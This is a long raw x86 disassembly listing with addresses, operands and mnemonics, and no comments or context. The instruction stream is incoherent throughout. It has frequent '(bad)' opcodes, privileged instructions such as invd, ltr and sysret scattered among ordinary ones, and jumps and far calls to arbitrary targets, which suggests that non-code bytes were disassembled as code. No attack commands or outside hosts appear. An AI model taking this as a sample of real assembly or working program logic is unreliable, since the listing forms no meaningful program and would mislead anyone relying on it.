  4323c2:	out    0x8d,al
  4323c4:	add    BYTE PTR [eax],cl
  4323c6:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  4323cc:	ret    0x450c
  4323cf:	sbb    al,0x8b
  4323d1:	cmp    eax,esi
  4323d3:	or     cl,al
  4323d5:	or     al,0xc2
  4323d7:	pop    eax
  4323d8:	inc    ebp
  4323d9:	add    ecx,DWORD PTR [edi]
  4323db:	add    esi,DWORD PTR [ebp+0x39]
  4323de:	invd   
  4323e0:	jge    0x4323ec
  4323e2:	mov    eax,0x478ac0
  4323e7:	cli    
  4323e8:	xor    esp,ecx
  4323ea:	mov    ebx,0x5b8ac0
  4323ef:	ret    0x33
  4323f2:	mov    eax,0x833b8b
  4323f7:	sub    BYTE PTR [ebx],al
  4323f9:	inc    ebp
  4323fa:	xor    ax,0x9cf8
  4323fe:	inc    bh
  432400:	mov    esp,esp
  432402:	hlt    
  432403:	test   DWORD PTR [ebp-0x8],esi
  432406:	mov    eax,DWORD PTR [ebp-0x14]
  432409:	cmp    ecx,DWORD PTR [ebx-0x76478864]
  43240f:	dec    edi
  432410:	or     BYTE PTR [eax],al
  432412:	jne    0x43239d
  432414:	mov    esi,esp
  432416:	call   0x77a9afdb
  43241b:	inc    ebp
  43241c:	mov    DWORD PTR [eax+0x9a4f0c],edi
  432422:	add    BYTE PTR [ecx-0x3ffe0717],cl
  432428:	add    BYTE PTR [esi+0x7d],ah
  43242b:	inc    ebp
  43242c:	mov    bx,WORD PTR [ebp+0x8]
  432430:	add    DWORD PTR [ebp+0x53],0x30c008b
  432437:	inc    ebp
  432438:	mov    bx,di
  43243b:	lock test BYTE PTR [ecx+0x7000801],bh
  432442:	jge    0x432405
  432444:	mov    ecx,DWORD PTR [ebx-0x650613f0]
  43244a:	cli    
  43244b:	xor    bl,bh
  43244d:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  432453:	test   BYTE PTR [eax],cl
  432455:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  43245c:	cmp    ebp,eax
  43245e:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  432465:	test   BYTE PTR [ebp+0x1],bh
  432468:	mov    ebx,0x458a00
  43246d:	xor    esi,DWORD PTR [ebx]
  43246f:	add    esp,DWORD PTR [esi-0x77]
  432472:	pop    ebp
  432473:	loopne 0x4324db
  432475:	inc    ebp
  432476:	clc    
  432477:	xor    edi,DWORD PTR [ebx]
  432479:	add    esi,DWORD PTR [edx-0x77]
  43247c:	data16 fdivr QWORD PTR [ebp-0x49]
  432480:	mov    ebx,0xb78afc
  432485:	hlt    
  432486:	xor    edi,DWORD PTR [edx]
  432488:	data16 add BYTE PTR [ebp+0x66],bl
  43248c:	data16 lock clc 
  43248f:	cmp    bh,BYTE PTR [ebx]
  432491:	add    BYTE PTR [edi+0x66],dh
  432494:	psubq  mm7,QWORD PTR [ebp+0x0]
  432498:	ltr    WORD PTR [ebp+0x66]
  43249c:	add    esi,eax
  43249e:	add    di,WORD PTR [ebp+0x2b]
  4324a2:	data16 data16 jge 0x432523
  4324a6:	mov    ebx,0xe08a8b
  4324ab:	jge    0x4324e0
  4324ad:	data16 data16 xor al,0x5d
  4324b1:	data16 data16 jne 0x4324ad
  4324b5:	mov    edi,DWORD PTR [ebx]
  4324b7:	fdiv   QWORD PTR [edx+0x7d]
  4324ba:	data16 data16 jge 0x4324f2
  4324be:	mov    ebx,0x758a66
  4324c3:	mov    esi,0x667233
  4324c8:	pop    ebp
  4324c9:	or     BYTE PTR [esi+0x0],ah
  4324cc:	clc    
  4324cd:	mov    edi,DWORD PTR [ebx]
  4324cf:	lock ja 0x43245d
  4324d2:	(bad)  
  4324d4:	jge    0x4324cd
  4324d6:	invd   
  4324d8:	pop    ebp
  4324d9:	add    BYTE PTR [ebx],al
  4324db:	(bad)  
  4324dc:	cmp    di,WORD PTR [ebp+0xf]
  4324e0:	data16 sbb bh,BYTE PTR [ebp+0x0]
  4324e4:	mov    bx,WORD PTR [ebp-0x10]
  4324e8:	pop    bp
  4324ea:	fbstp  TBYTE PTR [ebx]
  4324ec:	test   DWORD PTR [ebx],eax
  4324ee:	add    BYTE PTR [ebx],bh
  4324f0:	add    BYTE PTR [esi+0x7d],ah
  4324f3:	jge    0x432480
  4324f5:	data16 in al,dx
  4324f7:	pop    ebp
  4324f8:	stc    
  4324f9:	bsf    ecx,DWORD PTR [ebp+0x6632009a]
  432500:	mov    edi,ebx
  432502:	in     al,dx
  432503:	test   BYTE PTR [ebp+0x0],bh
  432506:	mov    eax,DWORD PTR [eax]
  432508:	call   0xbd401e98
  43250d:	cmp    bl,BYTE PTR [edx-0x7699ce00]
  432513:	sti    
  432514:	call   0x8b4ba2a4
  432519:	add    ebp,esp
  43251b:	mov    bx,di
  43251e:	jnp    0x432546
  432520:	mov    DWORD PTR [ebx+0x3a7df808],ecx
  432526:	mov    eax,DWORD PTR [eax]
  432528:	call   0x7c3eb093
  43252d:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  432533:	data16 data16 fistp WORD PTR [ebp+0xe]
  432538:	xor    DWORD PTR [edi-0x48fff7ad],0xfb66f403
  432542:	fisttp WORD PTR [ecx-0x7401f77b]
  432548:	(bad)  
  432549:	cld    
  43254a:	jne    0x432586
  43254c:	xor    eax,DWORD PTR [eax]
  43254e:	mov    esp,DWORD PTR [esi-0x10]
  432551:	sti    
  432552:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  432559:	data16 adc bl,bh
  43255c:	push   ebp
  43255d:	xor    ecx,DWORD PTR es:[ebx+0x3ae4f88b]
  432564:	mov    WORD PTR [eax],es
  432566:	call   0xe48b:0x89fb3266
  43256d:	or     al,0x55
  43256f:	add    ecx,DWORD PTR [ebx-0x7420139a]
  432575:	push   cs
  432576:	push   esi
  432577:	mov    bh,0xc8
  432579:	or     al,0x2b
  43257b:	mov    bh,0xba
  43257d:	hlt    
  43257e:	mov    bh,bl
  432580:	add    BYTE PTR [ecx-0x7446f3cd],cl
  432586:	dec    edi
  432587:	or     al,0x0
  432589:	mov    edi,DWORD PTR [ebx]
  43258b:	or     BYTE PTR [ebp+0x3b],dh
  43258e:	mov    ecx,DWORD PTR [edi]
  432590:	fdivr  QWORD PTR [ebx-0x7499ff83]
  432596:	xor    al,0xd8
  432598:	pop    bp
  43259a:	lock xor esi,DWORD PTR [ebx]
  43259d:	lea    esp,[esi+0x1f]
  4325a0:	icebp  
  4325a1:	jb     0x4325a7
  4325a3:	add    al,al
  4325a5:	jge    0x4325b3
  4325a7:	mov    eax,eax
  4325a9:	fsubr  st,st(3)
  4325ab:	pop    ebp
  4325ac:	mov    esi,DWORD PTR [ebx]
  4325ae:	in     al,0x8d
  4325b0:	rcr    DWORD PTR [edi],0xc2
  4325b3:	jb     0x432613
  4325b5:	add    cl,cl
  4325b7:	jge    0x4325c5
  4325b9:	mov    edx,DWORD PTR [ebp-0x20]
  4325bc:	in     al,dx
  4325bd:	pop    ebp
  4325be:	data16 data16 or BYTE PTR [esi+edi*4],bh
  4325c3:	cmp    di,WORD PTR [ebp+0x0]
  4325c7:	mov    ebp,DWORD PTR [ebx]
  4325c9:	fdivr  QWORD PTR [esi+0x668a5d]
  4325cf:	cmp    al,0x33
  4325d1:	mov    si,0x4f7d
  4325d5:	mov    eax,DWORD PTR [eax]
  4325d7:	lock inc ebp
  4325d9:	mov    esi,DWORD PTR [esi]
  4325db:	or     BYTE PTR [edi+esi*8+0x8508ba],bl
  4325e2:	clc    
  4325e3:	(bad)  
  4325e4:	cmp    edi,DWORD PTR [ebx]
  4325e6:	je     0x4325f7
  4325e8:	push   ebx
  4325e9:	loopne 0x4325fa
  4325eb:	dec    ecx
  4325ed:	mov    esp,DWORD PTR [esi-0x1c]
  4325f0:	int    0xf1
  4325f2:	mov    esi,0x703084d
  4325f7:	pcmpgtd mm6,mm1
  4325fa:	add    BYTE PTR [ebp+0x66],dh
  4325fd:	jmp    0x4325ca
  4325ff:	mov    eax,DWORD PTR [ebx]
  432601:	lock push ebp
  432603:	ror    DWORD PTR [ebp-0x2972feb3],1
  432609:	or     bh,dl
  43260b:	jb     0x43260b
  43260d:	add    BYTE PTR [ebx-0x1a7487b3],cl
  432613:	loopne 0x432615
  432615:	jne    0x432617
  432617:	data16 add BYTE PTR [esi+eiz*2],dh
  43261b:	mov    ecx,ebx
  43261d:	data16 cmp dh,cl
  432620:	add    BYTE PTR [edx],bh
  432622:	data16 add bl,cl
  432625:	data16 cmp dh,dl
  432628:	add    BYTE PTR [edx],bh
  43262a:	data16 add bl,cl
  43262d:	enterw 0x4df1,0x19
  432632:	pop    edi
  432633:	jne    0x4325b6
  432635:	mov    esi,DWORD PTR [esi]
  432637:	call   0x77b7b1d8
  43263c:	xor    ebp,DWORD PTR [ebx]
  43263e:	lea    esp,[esi+0x48]
  432641:	repnz in eax,0x3b
  432644:	add    BYTE PTR [ebp-0x37],dh
  432647:	xor    edx,DWORD PTR [ebp-0x15]
  43264a:	in     al,dx
  43264b:	xor    edx,DWORD PTR [esi+0x40]
  43264e:	mov    DWORD PTR [edi],0x338545fc
  432654:	clc    
  432655:	add    esi,DWORD PTR ds:0xe85b9c5f
  43265b:	ret    0xff
  43265e:	dec    DWORD PTR [ebx-0x74f8ae08]
  432664:	cmp    DWORD PTR [esi+0x45],edx
  432667:	add    BYTE PTR [eax+eax*1+0x61],bh
  43266b:	data16 (bad) 
  43266d:	into   
  43266e:	data16 cmp cl,ch
  432671:	add    BYTE PTR [ecx+0x7ce0866],bh
  432677:	cmp    ah,BYTE PTR [esi+0x0]
  43267a:	add    bh,al
  43267c:	add    ah,bh
  43267e:	add    BYTE PTR [ebp+0x35c3f866],al
  432684:	cmp    bl,BYTE PTR [eax+eax*1-0x3c31999a]
  43268b:	pop    ebp
  43268c:	adc    al,0x57
  43268e:	add    BYTE PTR [edi-0x723c409a],dh
  432694:	add    edi,edi
  432696:	jne    0x4326eb
  432698:	lea    edx,[ecx+0x1]
  43269b:	mov    ebx,0xd64ff1
  4326a0:	sar    DWORD PTR [ebx],1
  4326a2:	test   BYTE PTR [ebp+0x34],dh
  4326a5:	mov    DWORD PTR [esp+edi*8-0x76],esp
  4326a9:	push   edi
  4326aa:	xor    BYTE PTR [ebx],0x39
  4326ad:	mov    esi,ebx
  4326af:	xor    eax,DWORD PTR [eax-0x3c73839a]
  4326b5:	xor    al,0x45
  4326b7:	fs pop ebx
  4326b9:	mov    ebx,0x9c3b36
  4326be:	je     0x4326eb
  4326c0:	xor    edi,DWORD PTR [ebx+0x668a33]
  4326c6:	mov    WORD PTR [ebx],?
  4326c8:	xor    al,0xbb
  4326ca:	fs dec edi
  4326cc:	mov    eax,DWORD PTR [eax]
  4326ce:	pop    edi
  4326cf:	cmp    ecx,ecx
  4326d1:	jne    0x432728
  4326d3:	mov    ebp,esp
  4326d5:	cld    
  4326d6:	push   esi
  4326d7:	pop    ebx
  4326d8:	inc    ebp
  4326d9:	stc    
  4326da:	test   DWORD PTR ss:[eax+edi*8-0x317af642],ebx
  4326e2:	clc    
  4326e3:	test   dl,dl
  4326e5:	jmp    DWORD PTR ss:[esi+eiz*2+0x5e]
  4326ea:	or     bl,al
  4326ec:	add    BYTE PTR [ebx+0x57665100],cl
  4326f2:	retf   0x3a45
  4326f5:	add    BYTE PTR ss:[esi+eiz*2+0x3a85cabe],bl
  4326fd:	clc    
  4326fe:	add    BYTE PTR [ebx+0x66],bl
  432701:	dec    edx
  432703:	mov    edx,DWORD PTR [edi-0x76]
  432706:	push   edi
  432707:	add    al,0xb7
  432709:	xor    al,0xba
  43270b:	cmp    al,0x8d
  43270d:	je     0x43270e
  43270f:	mov    edx,DWORD PTR [ebx-0x46]
  432712:	push   ecx
  432713:	lea    edi,[ebx+0x534fff]
  432719:	push   ecx
  43271a:	cmp    edx,DWORD PTR [ebx+0x75]
  43271d:	mov    ecx,DWORD PTR [ecx+0x723bfcbb]
  432723:	add    BYTE PTR [ebx],dh
  432725:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  43272b:	add    BYTE PTR [ebx+esi*1+0x4f64bb34],cl
  432732:	mov    ebx,0x3b3b00
  432737:	jne    0x432764
  432739:	mov    DWORD PTR [ebx+0x728afc],edi
  43273f:	xor    esi,DWORD PTR [ebx]
  432741:	mov    edi,DWORD PTR [ebx+0x8d4f33]
  432747:	push   edi
  432748:	cmp    esp,ebp
  43274a:	jne    0x43274c
  43274c:	sbb    DWORD PTR [eax],0x8085c3fc
  432752:	clc    
  432753:	inc    ebp
  432754:	pop    ebx
  432755:	sti    
  432756:	add    eax,0xeb8bc075
  43275b:	cld    
  43275c:	xor    edi,DWORD PTR ds:0xf8c3855e
  432762:	mov    ecx,DWORD PTR [ecx+edx*2]
  432765:	rol    DWORD PTR [ebp-0x37],0xf
  432769:	mov    DWORD PTR [eax],ecx
  43276b:	inc    edi
  43276c:	(bad)  
  43276d:	in     eax,0x0
  43276f:	add    bh,bh
  432771:	(bad)  
  432772:	mov    esi,0xc38a5e
  432777:	mov    esi,DWORD PTR [ebx]
  432779:	push   ecx
  43277a:	mov    edi,0xfc4fc7
  43277f:	test   DWORD PTR [ebp-0x8],edx
  432782:	xor    ax,0x9cc7
  432786:	sub    ebp,eax
  432788:	inc    ebp
  432789:	(bad)  
  43278a:	sub    edi,edi
  43278c:	mov    DWORD PTR [ebx+0x3b03ba08],ecx
  432792:	inc    ebp
  432793:	add    BYTE PTR [esi+0x2b],ah
  432796:	or     bh,BYTE PTR [edx+0xf8ac2]
  43279c:	cmp    al,0x33
  43279e:	mov    edi,DWORD PTR [edx+0x4f81]
  4327a4:	(bad)  
  4327a5:	cmp    esi,DWORD PTR [ebx]
  4327a7:	je     0x432761
  4327a9:	push   ebx
  4327aa:	dec    edi
  4327ab:	str    ecx
  4327ae:	cmp    esp,DWORD PTR [esi+0x75]
  4327b1:	int    0x33
  4327b3:	mov    edi,0x789085f
  4327b8:	mov    edx,DWORD PTR [esp+edi*8]
  4327bb:	add    cl,cl
  4327bd:	data16 add al,0xcb
  4327c0:	push   ebp
  4327c1:	add    ebp,esp
  4327c3:	jne    0x4327b1
  4327c5:	(bad)  
  4327c6:	mov    DWORD PTR [ecx],0xd685f7ec
  4327cc:	clc    
  4327cd:	xlat   BYTE PTR ds:[ebx]
  4327ce:	inc    ebp
  4327cf:	mov    esi,DWORD PTR [eax+edx*2]
  4327d2:	pushf  
  4327d3:	in     eax,0x8b
  4327d5:	add    ah,ch
  4327d7:	add    BYTE PTR [ebx+0x0],dl
  4327da:	push   ecx
  4327db:	add    ax,0x72cb
  4327df:	cmp    al,BYTE PTR [eax]
  4327e1:	add    BYTE PTR [ebp+0x66],al
  4327e4:	(bad)  
  4327e5:	retf   
  4327e6:	lock cmp al,BYTE PTR [ebp+0x4566f800]
  4327ed:	retf   
  4327ee:	cmp    eax,ecx
  4327f0:	pushf  
  4327f1:	jge    0x4327ba
  4327f3:	ss cld 
  4327f5:	pushf  
  4327f6:	test   DWORD PTR [edi-0x8],ebx
  4327f9:	je     0x432840
  4327fb:	xor    esi,DWORD PTR ds:0x7020840
  432801:	ror    BYTE PTR [ebp-0x37],0x8d
  432805:	push   ebp
  432806:	add    esp,ebp
  432808:	jb     0x432795
  43280a:	add    BYTE PTR [eax],cl
  43280c:	dec    ebp
  43280d:	mov    bh,0x81
  43280f:	push   esi
  432810:	push   ebx
  432811:	adc    DWORD PTR [ecx-0x3b],0x3a9aff81
  432818:	xor    al,BYTE PTR [eax]
  43281a:	mov    edx,DWORD PTR [edi+0x10]
  43281d:	(bad)  
  43281e:	scas   eax,DWORD PTR es:[edi]
  43281f:	cmp    bh,BYTE PTR [ebx]
  432821:	add    BYTE PTR [edi],cl
  432823:	mov    ebp,ebp
  432825:	cld    
  432826:	add    BYTE PTR [ebx],bh
  432828:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  43282c:	dec    ebp
  43282d:	or     BYTE PTR [ebx],ch
  43282f:	ret    0x458b
  432832:	lock jmp 0x432826
  432835:	mov    ecx,DWORD PTR [eax]
  432837:	or     BYTE PTR [edi],al
  432839:	mov    ecx,eax
  43283b:	xor    DWORD PTR [edx+0x2],0x0
  43283f:	mov    bh,0xc1
  432841:	adc    BYTE PTR [eax],dh
  432843:	iret   
  432844:	inc    ebp
  432845:	mov    DWORD PTR [ebx],0x4dfff8c5
  43284b:	inc    BYTE PTR [ebx]
  43284d:	cmp    bh,al
  43284f:	add    BYTE PTR [ecx],dl
  432851:	data16 adc al,bh
  432854:	dec    ecx
  432855:	fisttp WORD PTR [ecx+0x456604c0]
  43285b:	add    dh,BYTE PTR ds:0x75e0845
  432861:	ret    0x4d
  432864:	lea    ecx,[ebx+0x18728301]
  43286a:	add    BYTE PTR [ebp+0x45],al
  43286d:	xor    eax,0xc7009ce9
  432872:	add    al,ch
  432874:	inc    ebp
  432875:	test   DWORD PTR [ebx-0x3eba0708],ecx
  43287b:	xor    eax,0x781084d
  432880:	push   ebx
  432881:	call   0xf89a:0x89813251
  432888:	xor    al,BYTE PTR [ebp+0x3b]
  43288b:	cmp    eax,0xc78b9c76
  432890:	or     ah,dh
  432892:	inc    ebp
  432893:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  432899:	cmp    ecx,DWORD PTR [ebx-0x74747664]
  43289f:	in     al,dx
  4328a0:	hlt    
  4328a1:	push   ebx
  4328a2:	push   ebx
  4328a3:	push   ecx
  4328a4:	push   ecx
  4328a5:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  4328ab:	call   0xe889:0x8b32329a
  4328b2:	clc    
  4328b3:	icebp  
  4328b4:	pop    ebx
  4328b5:	or     BYTE PTR [ebp+0x7],al
  4328b8:	mov    eax,ecx
  4328ba:	clc    
  4328bb:	jb     0x43287e
  4328bd:	add    BYTE PTR [ebp+0x55],cl
  4328c0:	or     DWORD PTR [edi],0xc251d153
  4328c6:	add    DWORD PTR [ebx+0x32009a],0x8b76453b
  4328d0:	mov    edi,eax
  4328d2:	or     cl,al
  4328d4:	inc    ebp
  4328d5:	dec    ebp
  4328d6:	mov    eax,DWORD PTR [ecx+0x514d530c]
  4328dc:	or     WORD PTR [ecx],0x899a
  4328e1:	xor    cl,BYTE PTR [ebx+0x5376fc3b]
  4328e7:	mov    edx,DWORD PTR [ecx+0x8]
  4328ea:	mov    eax,DWORD PTR [ebp-0x8]
  4328ed:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb266]
  4328f4:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  4328fa:	inc    ebp
  4328fb:	dec    eax
  4328fc:	add    ecx,DWORD PTR [ebx+0x534df0f8]
  432902:	add    edx,DWORD PTR [ecx-0x8]
  432905:	mov    ecx,DWORD PTR [ecx]
  432907:	clc    
  432908:	or     BYTE PTR [ebp+eax*2+0x4532409a],al
  43290f:	mov    ecx,ebp
  432911:	clc    
  432912:	(bad)  
  432913:	popf   
  432914:	inc    DWORD PTR [eax]
  432916:	ret    0x8b
  432919:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  43291f:	mov    edi,esp
  432921:	hlt    
  432922:	test   ecx,esi
  432924:	clc    
  432925:	or     BYTE PTR [ebp+0x7],al
  432928:	xor    al,0xc1
  43292a:	pushf  
  43292b:	jb     0x432960
  43292d:	add    BYTE PTR [eax-0x3f],al
  432930:	inc    eax
  432931:	daa    
  432932:	inc    ebp
  432933:	inc    ebp
  432934:	xor    eax,0x7f80803
  432939:	dec    ebp
  43293a:	call   0xc09:0x39f83203
  432941:	or     BYTE PTR [edx],al
  432943:	inc    ebp
  432944:	sub    al,0x35
  432946:	inc    ebp
  432947:	or     BYTE PTR ds:0x74d0807,dh
  43294d:	lea    ebx,[edx-0x748dcdff]
  432953:	add    BYTE PTR [eax*2-0x74b21438],cl
  43295a:	mov    edx,DWORD PTR [eax]
  43295c:	cld    
  43295d:	dec    ebp
  43295e:	push   ebx
  43295f:	sub    edx,DWORD PTR [ecx-0x75]
  432962:	add    eax,0xf172fc
  432967:	or     BYTE PTR [ebp+0x7],cl
  43296a:	add    eax,ecx
  43296c:	or     al,0x72
  43296e:	add    DWORD PTR [eax],eax
  432970:	mov    ebx,0x29c2c1
  432975:	inc    ebp
  432976:	mov    eax,DWORD PTR [ebx]
  432978:	cmp    eax,0x3004d1c
  43297e:	xbegin 0x66c8b578
  432984:	clc    
  432985:	or     BYTE PTR [ebp+0x45],al
  432988:	xor    al,0x35
  43298a:	pushf  
  43298b:	or     BYTE PTR [ebx+0x454d1007],cl
  432991:	lea    eax,[ebp+0x33727501]
  432997:	add    cl,ch
  432999:	inc    ebp
  43299a:	add    bl,ch
  43299c:	add    BYTE PTR [ebx+0x45850845],cl
  4329a2:	je     0x43292f
  4329a4:	push   ebx
  4329a5:	or     al,0x85
  4329a7:	dec    ebp
  4329a8:	std    
  4329a9:	mov    bh,bh
  4329ab:	mov    BYTE PTR [ebp-0x75],al
  4329ae:	mov    edi,eax
  4329b0:	or     al,0x89
  4329b2:	inc    ebp
  4329b3:	clc    
  4329b4:	mov    esp,esp
  4329b6:	hlt    
  4329b7:	call   DWORD PTR [edi-0x37]
  4329ba:	push   ebx
  4329bb:	or     al,0x51
  4329bd:	push   ebp
  4329be:	xor    ebp,esp
  4329c0:	mov    esi,0x457251
  4329c5:	xor    eax,0xc7459cc6
  4329ca:	mov    edi,eax
  4329cc:	or     al,0x85
  4329ce:	add    al,bh
  4329d0:	inc    eax
  4329d2:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  4329d6:	or     ah,bh
  4329d8:	inc    eax
  4329d9:	push   ebx
  4329da:	jmp    0x432a2d
  4329dc:	mov    eax,DWORD PTR ds:0xe8720c
  4329e2:	mov    DWORD PTR [ebp-0x8],eax
  4329e5:	jne    0x432a2c
  4329e7:	jmp    0x432974
  4329e9:	mov    ebp,DWORD PTR [eax]
  4329eb:	clc    
  4329ec:	retf   0xff53
  4329ef:	push   ecx
  4329f0:	mov    DWORD PTR ds:0x757210,eax
  4329f6:	mov    ecx,DWORD PTR [ebp-0x4]
  4329f9:	sub    esp,DWORD PTR [ebx-0x77]
  4329fc:	dec    DWORD PTR [eax*4-0x74ca8abb]
  432a03:	or     ah,bh
  432a05:	pop    es
  432a06:	ds call 0x8f0:0x8b8b32ff
  432a0e:	(bad)  
  432a0f:	dec    ebp
  432a10:	(bad)  
  432a11:	mov    bh,bh
  432a13:	jmp    0x432a01
  432a15:	leave  
  432a16:	jne    0x432a20
  432a18:	call   0x302372
  432a1d:	in     al,dx
  432a1e:	dec    ebp
  432a1f:	add    dh,BYTE PTR [ebx]
  432a21:	add    BYTE PTR [ebx],al
  432a23:	inc    ebp
  432a24:	cmp    esi,DWORD PTR ds:0xc78b9c74
  432a2a:	or     al,0xf0
  432a2c:	add    BYTE PTR [ebp+0x458bf845],al
  432a32:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  432a38:	adc    al,0x7
  432a3a:	enter  0x9fc0,0xa5
  432a3e:	rol    BYTE PTR [eax],0x5e
  432a41:	mov    ecx,ecx
  432a43:	or     al,0xc
  432a45:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  432a4c:	jmp    0x432a4d
  432a4e:	push   ebp
  432a4f:	mov    esp,ebp
  432a51:	cld    
  432a52:	inc    ebp
  432a53:	inc    ebp
  432a54:	or     DWORD PTR [ecx+0x457dec10],0x0
  432a5b:	push   esi
  432a5c:	push   esi
  432a5d:	mov    edi,0x7af080f
  432a62:	add    bh,al
  432a64:	test   DWORD PTR [edx+0x3a7320f],ebx
  432a6a:	add    BYTE PTR [ecx+0x4540100f],cl
  432a70:	mov    ebp,eax
  432a72:	mov    ebp,edi
  432a74:	lock call edx
  432a77:	fcom   DWORD PTR [ebp+0x45]
  432a7a:	mov    eax,0x148a8b
  432a7f:	push   ecx
  432a80:	enter  0xc145,0x83
  432a84:	cmp    ecx,DWORD PTR [eax]
  432a86:	add    BYTE PTR [ebp+0x4d],al
  432a89:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  432a8f:	call   0xffa325fe
  432a94:	cmp    eax,DWORD PTR [ebp-0xc]
  432a97:	jmp    DWORD PTR [eax+edx*1-0x4e]
  432a9b:	push   ebp
  432a9c:	(bad)
  432a9f:	std    
  432aa0:	lock push DWORD PTR [edi+0x5d08fcdb]
  432aa7:	inc    ebp
  432aa8:	(bad)  
  432aa9:	call   0xff7d2739
  432aae:	add    al,BYTE PTR [ebp+0x37]
  432ab1:	xor    esi,DWORD PTR [edi+0x4f50bf03]
  432ab7:	jne    0x432ab9
  432ab9:	(bad)  
  432aba:	cmp    edi,esp
  432abc:	jne    0x432aef
  432abe:	mov    edi,edi
  432ac0:	or     BYTE PTR [ebx-0x307f0b49],cl
  432ac6:	pop    ds
  432ac7:	into   
  432ac8:	je     0x432a8b
  432aca:	mov    ebx,DWORD PTR [esi]
  432acc:	or     BYTE PTR [ebp-0x49],al
  432acf:	mov    esp,DWORD PTR [esi-0x77]
  432ad2:	mov    esi,0x451f0c
  432ad7:	mov    eax,DWORD PTR [eax]
  432ad9:	or     al,0x66
  432adb:	sar    bl,0x3b
  432ade:	xor    esi,DWORD PTR [ebp+0x66]
  432ae1:	xor    ecx,edi
  432ae3:	pop    edi
  432ae4:	adc    bl,BYTE PTR [ebx+0x7c]
  432ae7:	ret    0xff
  432aea:	cld    
  432aeb:	inc    ebp
  432aec:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  432af2:	cld    
  432af3:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  432afa:	push   0xffffff83
  432afc:	pop    edi
  432afd:	or     BYTE PTR [ebp+0x53],dh
  432b00:	xorps  xmm1,xmm2
  432b03:	test   BYTE PTR [eax+eax*1],bh
  432b06:	add    BYTE PTR [eax],al
  432b08:	adc    eax,eax
  432b0a:	add    DWORD PTR [esp+edi*2-0xff7b00],0xffffffb7
  432b12:	jmp    DWORD PTR [eax]
  432b14:	ror    al,0x5e
  432b17:	inc    ebp
  432b18:	leave  
  432b19:	xor    ecx,DWORD PTR [eax]
  432b1b:	and    DWORD PTR [ebx-0x3ec50708],ecx
  432b21:	add    ch,al
  432b23:	xor    edi,edi
  432b25:	xor    DWORD PTR [ebx],0x66003300
  432b2b:	mov    DWORD PTR [ebp-0xc],ecx
  432b2e:	pcmpgtw mm0,mm0
  432b31:	add    dl,ah
  432b33:	leave  
  432b34:	mov    edi,DWORD PTR [esi-0x7d]
  432b37:	push   ax
  432b39:	dec    ebp
  432b3a:	mov    esi,DWORD PTR [ebx-0x75]
  432b3d:	lea    ebp,[eax-0x7c010000]
  432b43:	xor    eax,DWORD PTR [eax]
  432b45:	sysret 
  432b47:	dec    ebp
  432b48:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  432b4f:	push   WORD PTR [ecx+0x8]
  432b53:	jne    0x432b16
  432b55:	ud0    ecx,DWORD PTR [ecx]
  432b58:	mov    edi,DWORD PTR [edx]
  432b5a:	lods   al,BYTE PTR ds:[esi]
  432b5b:	add    BYTE PTR [eax],al
  432b5d:	data16 (bad) 
  432b5f:	iret   
  432b60:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  432b67:	cli    
  432b68:	inc    ebp
  432b69:	cmp    al,0x8d
  432b6b:	add    BYTE PTR [esi+0x2d],ah
  432b6e:	inc    ebp
  432b6f:	pop    ebp
  432b70:	lea    ecx,[edi]
  432b72:	mov    dl,bh
  432b74:	add    BYTE PTR [edi],cl
  432b76:	mov    DWORD PTR [eax+eax*8],edi
  432b79:	mov    ebx,0x3b87
  432b7e:	add    BYTE PTR [ebx],ch
  432b80:	inc    ebp
  432b81:	data16 (bad) 
  432b83:	clc    
  432b84:	int3   
  432b85:	cmp    eax,DWORD PTR [eax]
  432b87:	je     0x432b12
  432b89:	push   0xffffffc8
  432b8b:	pop    edi
  432b8c:	xchg   DWORD PTR [ebp+0x0],eax
  432b8f:	data16 add BYTE PTR [ebp+0x45],cl
  432b93:	lea    cx,[ebp+0x10]
  432b97:	jb     0x432b99
  432b99:	jmp    0x432b24
  432b9b:	call   eax
  432b9d:	clc    
  432b9e:	xchg   DWORD PTR [edi+0x1],edi
  432ba1:	mov    eax,DWORD PTR [eax]
  432ba3:	or     BYTE PTR [ebp-0x49],al
  432ba6:	lea    eax,[eax+0x74003154]
  432bac:	push   edi
  432bad:	inc    edx
  432bae:	jge    0x432baf
  432bb0:	mov    DWORD PTR [edi],ecx
  432bb2:	fdiv   DWORD PTR [edi-0x6]
  432bb5:	inc    DWORD PTR [eax]
  432bb7:	xor    edx,DWORD PTR [eax+0x5f]
  432bba:	xchg   DWORD PTR [ebx+0x1],ebx
  432bbd:	ret    0x0
  432bc0:	xor    BYTE PTR [ebp-0x51],cl
  432bc3:	cmp    edi,0xf0ff8900
  432bc9:	data16 ror al,0x84
  432bcd:	rol    BYTE PTR [eax],0x3b
  432bd0:	add    al,dh
  432bd2:	dec    eax
  432bd3:	xchg   esp,eax
  432bd4:	push   ebx
  432bd5:	jmp    0x432b62
  432bd7:	push   ebp
  432bd8:	add    esp,ebp
  432bda:	add    ebp,esp
  432bdc:	mov    edx,DWORD PTR [edi+0x24]
  432bdf:	clc    
  432be0:	dec    esi
  432be1:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  432be7:	cmp    BYTE PTR [ebx],al
  432be9:	jne    0x432b74
  432beb:	xor    esp,eax
  432bed:	jmp    0x462d70
  432bf2:	add    ebp,DWORD PTR [ecx+ecx*4]
  432bf5:	jne    0x432beb
  432bf7:	call   0xffcd2951
  432bfc:	clc    
  432bfd:	xchg   edi,eax
  432bfe:	sti    
  432bff:	add    DWORD PTR [ebx],eax
  432c01:	add    BYTE PTR [ebp+0x47],bl
